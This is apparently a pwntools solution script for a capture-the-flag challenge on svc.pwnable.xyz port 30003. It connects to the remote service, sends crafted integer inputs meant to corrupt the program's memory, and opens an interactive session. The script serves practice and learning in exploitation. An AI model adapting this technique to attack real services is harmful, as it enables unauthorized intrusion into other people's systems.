#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./challenge')
#p = process()
p = remote('svc.pwnable.xyz',30003)
#gdb.attach(p,gdbscript='''
#           b*main+123
#           b*main+128
#           ''')
input()
p.sendline("-5404319552844595200 0 -6")


p.sendline("184549376 0 -5")        
p.sendline("a")
p.interactive()
